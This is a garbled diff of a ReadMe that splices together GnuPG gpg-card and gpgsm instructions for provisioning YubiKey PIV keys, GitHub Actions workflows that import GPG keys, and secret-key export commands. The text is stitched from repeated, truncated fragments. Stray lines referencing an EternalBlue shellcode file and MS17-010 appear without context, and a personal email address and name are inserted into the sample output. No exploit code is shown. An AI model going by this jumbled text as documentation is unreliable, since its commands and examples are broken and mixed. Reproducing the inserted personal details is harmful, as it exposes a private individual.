++The application slot where the key is stored on the card. For example "OpenPGP.1"
++
++Status
++The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.
++
++YUBIKEY cmd args
++Various commands pertaining to Yubikey tokens with cmd being:
++
++LIST
++List supported and enabled Yubikey applications.
++
++ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
++DISABLE
++Enable or disable the specified or all applications on the given interface.
++
++The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.
++
++GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:
++
++Authentication key
++This is a 24 byte key described by the hex string
++010203040506070801020304050607080102030405060708.
++
++PIV Application PIN
++This is the string 123456.
++
++PIN Unblocking Key
++This is the string 12345678.
++list (the string gpg/card>
++card> list
++Reader ...........: 1050:0407:X:0
++Card type ........: yubikey
++Card firmware ....: 5.1.2
++Serial number ....: D2760001240102010006090746250000
++Application type .: OpenPGP
++Version ..........: 2.1
++[...]
++on:
++  push:
++    tags:
++      - "v*"
++
++permissions:
++  contents: write
++
++jobs:
++  release:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@v3
++      - uses: cli/gh-extension-precompile@v1
++        with:
++          go_version: "1.16"
++Then
++- uses: cli/gh-extension-precompile@v1
++  env:
++    CGO_ENABLED: 1
++- uses: cli/gh-extension-precompile@v1
++  with:
++    build_script_override: "script/build.sh"
++name: release
++
++on:
++  push:
++    tags:
++      - "v*"
++
++permissions:
++  contents: write
++
++jobs:
++  release:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@v3
++      - id: import_gpg
++        uses: crazy-max/ghaction-import-gpg@v5
++        with:
++          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
++          passphrase: ${{ secrets.GPG_PASSPHRASE }}
++      - uses: cli/gh-extension-precompile@v1
++        with:
++          gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
++# macOS
++gpg --armor --export-secret-key joe@foo.bar | pbcopy
++
++# Ubuntu (assuming GNU base64)
++gpg --armor --export-secret-key joe@foo.bar -w0 | xclip
++
++# Arch
++gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i
++
++# FreeBSD (assuming BSD base64)
++gpg --armor --export-secret-key joe@foo.bar | xclip
++
++name: import-gpg
++
++on:
++  push:
++    branches: master
++
++jobs:
++  import-gpg:
++    runs-on: ubuntu-latest
++    steps:
++      -
++        name: Checkout
++        uses: actions/checkout@v4
++      -
++        name: Import GPG key
++        uses: crazy-max/ghaction-import-gpg@v6
++        with:
++          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
++          passphrase: ${{ secrets.PASSPHRASE }}
++      -
++        name: List keys
++        run: gpg -K
++name: import-gpg
++
++on:
++  push:
++    branches: master
+ 
++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
++gpg/card> writecert PIV.9D < encr.crt
++
++jobs:
++  import-gpg:
++    runs-on: ubuntu-latest
++    steps:
++      -
++        name: Checkout
++        uses: actions/checkout@v4
++      -
++        name: Import GPG key
++        uses: crazy-max/ghaction-import-gpg@v6
++        with:
++          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
++          passphrase: ${{ secrets.PASSPHRASE }}
++          fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
++      -
++        name: List keys
++        run: gpg -K
++
++pub   ed25519 2021-09-24 [C]
++      87F257B89CE462100BEC0FFE6071D218380FDCC8
++      Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
++uid           [ unknown] Joe Bar <joe@bar.foo>
++sub   ed25519 2021-09-24 [S]
++      C17D11ADF199F12A30A0910F1F80449BE0B08CB8
++      Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
++name: import-gpg
++/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add
++
++application-priority piv
++to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.
++
++With one of these methods employed the list command of gpg-card shows this:
++
++gpg/card> list
++Reader ...........: 1050:0407:X:0
++Card type ........: yubikey
++Card firmware ....: 5.1.2
++Serial number ....: FF020001008A77C1
++Application type .: PIV
++Version ..........: 1.0
++Displayed s/n ....: yk-9074625
++PIN usage policy .: app-pin
++PIN retry counter : - 3 -
++PIV authentication: [none]
++      keyref .....: PIV.9A
++Card authenticat. : [none]
++      keyref .....: PIV.9E
++Digital signature : [none]
++      keyref .....: PIV.9C
++Key management ...: [none]
++      keyref .....: PIV.9D
++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
++list --cards
++well. The PIV authentication key (internal reference PIV.9A
++Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption
++
++gpg/card> auth 010203040506070801020304050607080102030405060708
++gpg/card> auth < myauth.key
++
++gpg/card> generate --algo=nistp384 PIV.9A
++PIV card no. yk-9074625 detected
++gpg/card> generate --algo=nistp256 PIV.9E
++PIV card no. yk-9074625 detected
++gpg/card> generate --algo=rsa2048 PIV.9C
++PIV card no. yk-9074625 detected
++ ‘--force’
++gpg/card> list
++Reader ...........: 1050:0407:X:0
++Card type ........: yubikey
++Card firmware ....: 5.1.2
++Serial number ....: FF020001008A77C1
++Application type .: PIV
++Version ..........: 1.0
++Displayed s/n ....: yk-9074625
++PIN usage policy .: app-pin
++PIN retry counter : - 3 -
++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
++      keyref .....: PIV.9A  (auth)
++      algorithm ..: nistp384
++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
++      keyref .....: PIV.9E  (auth)
++      algorithm ..: nistp256
++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
++      keyref .....: PIV.9C  (sign,cert)
++      algorithm ..: rsa2048
++Key management ...: [none]
++      keyref .....: PIV.9D
++keygrip
++gpg
++self-signed X.509 certificate (exit the gpg-card tool, first):
++
++$ gpgsm --gen-key -o encr.crt
++   (1) RSA
++   (2) Existing key
++   (3) Existing key from card
++Your selection? 1
++What keysize do you want? (3072) 2048
++Requested keysize is 2048 bits
++Possible actions for a RSA key:
++   (1) sign, encrypt
++   (2) sign
++   (3) encrypt
++Your selection? 3
++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
++Enter email addresses (end with an empty line):
++> otto@example.net
++>
++Enter DNS names (optional; end with an empty line):
++>
++Enter URIs (optional; end with an empty line):
++>
++Create self-signed certificate? (y/N) y
++These parameters are used:
++    Key-Type: RSA
++    Key-Length: 2048
++    Key-Usage: encrypt
++    Serial: random
++    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
++    Name-Email: otto@example.net
++
++Proceed with creation? (y/N)
++Now creating self-signed certificate.  This may take a while ...
++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
++gpgsm: certificate created
++Ready.
++$ gpgsm --import encr.crt
++gpgsm: certificate imported
++gpgsm: total number processed: 1
++gpgsm:               imported: 1
++gpg/card> list
++Reader ...........: 1050:0407:X:0
++Card type ........: yubikey
++Card firmware ....: 5.1.2
++Serial number ....: FF020001008A77C1
++Application type .: PIV
++Version ..........: 1.0
++Displayed s/n ....: yk-9074625
++PIN usage policy .: app-pin
++PIN retry counter : - 3 -
++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
++      keyref .....: PIV.9A  (auth)
++      algorithm ..: nistp384
++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
++      keyref .....: PIV.9E  (auth)
++      algorithm ..: nistp256
++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
++      keyref .....: PIV.9C  (sign,cert)
++      algorithm ..: rsa2048
++Key management ...: [none]
++      keyref .....: PIV.9D
++keygrip 
++gpgsm --gen-key -o encr.crt
++   (1) RSA
++   (2) Existing key
++   (3) Existing key from card
++Your selection? 1
++What keysize do you want? (3072) 2048
++Requested keysize is 2048 bits
++Possible actions for a RSA key:
++   (1) sign, encrypt
++   (2) sign
++   (3) encrypt
++Your selection? 3
++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
++Enter email addresses (end with an empty line):
++> otto@example.net
++>
++Enter DNS names (optional; end with an empty line):
++>
++Enter URIs (optional; end with an empty line):
++>
++Create self-signed certificate? (y/N) y
++These parameters are used:
++    Key-Type: RSA
++    Key-Length: 2048
++    Key-Usage: encrypt
++    Serial: random
++    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
++    Name-Email: otto@example.net
++
++Proceed with creation? (y/N)
++Now creating self-signed certificate.  This may take a while ...
++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
++gpgsm: certificate created
++Ready.
++$ gpgsm --import encr.crt
++gpgsm: certificate imported
++gpgsm: total number processed: 1
++gpgsm:               imported: 1
++
++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
++gpg/card> writecert PIV.9D < encr.crt
++
++gpgsm --with-keygrip -k 6309304695z@gmail.com
++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
++      keyref .....: PIV.9D  (encr)
++      algorithm ..: rsa2048
++      used for ...: X.509
++        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
++        user id ..: <6309304695z@gmail.com>
++
++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
++
++$ gpgsm --learn
++$ gpgsm --gen-key -o sign.crt
++Please select what kind of key you want:
++   (1) RSA
++   (2) Existing key
++   (3) Existing key from card
++Your selection? 3
++Serial number of the card: FF020001008A77C1
++Available keys:
++   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
++   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
++   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
++   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
++Your selection? 3
++Possible actions for a RSA key:
++   (1) sign, encrypt
++   (2) sign
++   (3) encrypt
++Your selection? 2
++Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
++Enter email addresses (end with an empty line):
++> 6309304695z@gmail.com
++>
++Enter DNS names (optional; end with an empty line):
++>
++Enter URIs (optional; end with an empty line):
++>
++Create self-signed certificate? (y/N)
++These parameters are used:
++    Key-Type: card:PIV.9C
++    Key-Length: 1024
++    Key-Usage: sign
++    Serial: random
++    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
++    Name-Email: 6309304695z@gmail.com
++
++Proceed with creation? (y/N) y
++Now creating self-signed certificate.  This may take a while ...
++gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
++gpgsm: certificate created
++Ready.
++$ gpgsm --import sign.crt
++gpgsm: certificate imported
++gpgsm: total number processed: 1
++gpgsm:               imported: 1
++
++‘gpgsm --learn’
++Digital signature’ key
++gpg-card:010203040506070801020304050607080102030405060708
++
++shellcode/eternalblue_sc_merge.py
++
++gpg/card> writecert PIV.9C < sign.crt
+ on:
+   push:
+     branches: master
+
+AUTHENTICATE [--setkey] [--raw] [< file]|key]
+AUTH and set key
+
+GENERATE [--force] [--algo=algo{+algo2}] keyref
+Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref
+
+LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶
+L
+
+READCERT [--openpgp] certref > file ¶
+
+openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"
+
+WRITECERT certref < file ¶
+WRITECERT --openpgp certref [< file|fpr]
+WRITECERT --clear certref
+Write a certificate to the card under the id certref. 
+
+WRITEKEY [--force] keyref keygrip ¶
+Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key
+—Shadowed
+
+YUBIKEY cmd args ¶
+Various commands pertaining to Yubikey tokens with cmd being:
+
+LIST
+List supported and enabled Yubikey applications.
+
+ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
+DISABLE
+Enable or disable the specified or all applications on the given interface.
+
+Authentication key
+This is a 24 byte key described by the hex string
+010203040506070801020304050607080102030405060708.
+
+PIV
+
+Authentication key
+This is a 24 byte key described by the hex string
+010203040506070801020304050607080102030405060708
+
+the string gpg/card> is the prompt
+
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: D2760001240102010006090746250000
+Application type .: OpenPGP
+Version ..........: 2.1
+[...]
+
+use help yubikey).
+
+use help yubikey)
+
+gpg/card> yubikey disable all opgp
+gpg/card> yubikey list
+Application  USB    NFC
+-----------------------
+OTP          yes    yes
+U2F          yes    yes
+OPGP         no     no
+PIV          yes    no
+OATH         yes    yes
+FIDO2        yes    yes
+gpg/card> reset
+
+/.gnupg/scdaemon.conf
+
+application-priority piv
+
+scdaemon
+
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: [none]
+      keyref .....: PIV.9A
+Card authenticat. : [none]
+      keyref .....: PIV.9E
+Digital signature : [none]
+      keyref .....: PIV.9C
+Key management ...: [none]
+      keyref .....: PIV.9D
+In
+
+Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)
+
+Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):
+
+gpg/card> auth 010203040506070801020304050607080102030405060708
+
+gpg/card> auth < myauth.key
+
+gpg/card> generate --algo=nistp384 PIV.9A
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=nistp256 PIV.9E
+PIV card no. yk-9074625 detected
+gpg/card> generate --algo=rsa2048 PIV.9C
+PIV card no. yk-9074625 detected
+
+gpg/card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - 3 -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+Key management ...: [none]
+      keyref .....: PIV.9D 
+—force
+
+$ gpgsm --gen-key -o encr.crt
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 1
+What keysize do you want? (3072) 2048
+Requested keysize is 2048 bits
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 3
+Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N) y
+These parameters are used:
+    Key-Type: RSA
+    Key-Length: 2048
+    Key-Usage: encrypt
+    Serial: random
+    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N)
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpgsm: certificate created
+Ready.
+$ gpgsm --import encr.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+gpg/card> writecert PIV.9D < encr.crt
+
+[...]
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <otto@example.net>
+
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/
+
+$ gpgsm --learn
+$ gpgsm --gen-key -o sign.crt
+Please select what kind of key you want:
+   (1) RSA
+   (2) Existing key
+   (3) Existing key from card
+Your selection? 3
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
+Your selection? 3
+Possible actions for a RSA key:
+   (1) sign, encrypt
+   (2) sign
+   (3) encrypt
+Your selection? 2
+Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
+Enter email addresses (end with an empty line):
+> otto@example.net
+>
+Enter DNS names (optional; end with an empty line):
+>
+Enter URIs (optional; end with an empty line):
+>
+Create self-signed certificate? (y/N)
+These parameters are used:
+    Key-Type: card:PIV.9C
+    Key-Length: 1024
+    Key-Usage: sign
+    Serial: random
+    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
+    Name-Email: otto@example.net
+
+Proceed with creation? (y/N) y
+Now creating self-signed certificate.  This may take a while ...
+gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
+gpgsm: certificate created
+Ready.
+$ gpgsm --import sign.crt
+gpgsm: certificate imported
+gpgsm: total number processed: 1
+gpgsm:               imported: 1
+
+gpg/card> writecert PIV.9C < sign.crt
+
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - [verified] -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
+        user id ..: <otto@example.net>
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <otto@example.net>
+
+PIV authentication’ key with ssh:
+
+$ ssh-add -l
+384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)
+
+$ gpgsm --learn
+$ gpg --full-gen-key
+Please select what kind of key you want:
+   (1) RSA and RSA (default)
+   (2) DSA and Elgamal
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 3
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+
+GnuPG needs to construct a user ID to identify your key.
+
+Real name:
+Email address: otto@example.net
+Comment:
+You selected this USER-ID:
+    "otto@example.net"
+
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
+gpg: key C3AFA9ED971BB365 marked as ultimately trusted
+gpg: revocation certificate stored as '[...]D971BB365.rev'
+public and secret key created and signed.
+
+Note that this key cannot be used for encryption.  You may want to use
+the command "--edit-key" to generate a subkey for this purpose.
+pub   rsa2048 2019-04-04 [SC]
+      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid                      otto@example.net
+$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+Secret key is available.
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net
+gpg> addkey
+Secret parts of primary key are stored on-card.
+Please select what kind of key you want:
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+   (5) Elgamal (encrypt only)
+   (6) RSA (encrypt only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 4
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+Really create? (y/N) y
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+ssb  rsa2048/7067860A98FCE6E1
+     created: 2019-04-04  expires: never       usage: E
+     card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net
+
+gpg> save
+Now you can use your PIV card also with gpg.
+


diff --git a/ReadMe.md b/ReadMe.md
index 7278f80..41b298d 100644
--- a/ReadMe.md
+++ b/ReadMe.md
@@ -709,7 +709,844 @@ Digital signature’ key
 gpg-card:
 
 gpg/card> writecert PIV.9C < sign.crt
+# MS17-010
+# 000006
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - [verified] -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.co
+ m>
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.com>
+ PIV authentication’ key with ssh:
+
+$ ssh-add -l
+384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)
+ssh-add with the uppercase ‘-L
+$ gpgsm --learn
+$ gpg --full-gen-key
+Please select what kind of key you want:
+   (1) RSA and RSA (default)
+   (2) DSA and Elgamal
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 3
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+
+GnuPG needs to construct a user ID to identify your key.
+
+Real name: keith bieszczat
+Email address: 6309304695z@gmail.com
+Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator
+You selected this USER-ID:
+    "6309304695z@gmail.com"
+
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
+gpg: key C3AFA9ED971BB365 marked as ultimately trusted
+gpg: revocation certificate stored as '[...]D971BB365.rev'
+public and secret key created and signed.
+
+Note that this key cannot be used for encryption.  You may want to use
+the command "--edit-key" to generate a subkey for this purpose.
+pub   rsa2048 2019-04-04 [SC]
+      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid                      6309304695z@gmail.com
+
+ run gpg in --expert mode
+ $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+Secret key is available.
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net
+gpg> addkey
+Secret parts of primary key are stored on-card.
+Please select what kind of key you want:
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+   (5) Elgamal (encrypt only)
+   (6) RSA (encrypt only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 4
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+Really create? (y/N) y
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+ssb  rsa2048/7067860A98FCE6E1
+     created: 2019-04-04  expires: never       usage: E
+     card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net
+
+gpg> save
+ 
+/* 32A19-D90712   
+LEVEL-5 CLEARANCE ONLY
+ ‘--force’
+authentication key 
+-header-'010203040506070801020304050607080102030405060708'
+SETDATA hexstring
+to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
+
+  PKSIGN keyid
+where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
+
+  PKSIGN --hash=algoname keyid
+READKEY hexified_certid
+READCERT hexified_certid|keyid
+SERIALNO
+Return the serial number of the card using a status response like:
+
+  S SERIALNO D27600000000000000000000
+ WRITEKEY [--force] keyid
+SETDATA hexstring
+to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
+
+  PKDECRYPT keyid
+CHECKPIN idstr
+RESTART
+APDU [--atr] [--more] [--exlen[=n]] [hexstring]
+S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+
+./configure --sysconfdir=/etc --localstatedir=/va
+CN=Wurzel ZS 3,O=Intevation GmbH,C=DE
+  A6935DD34EF3087973C706FC311AA2CCF733765B S
+
+  # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE
+  DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
+
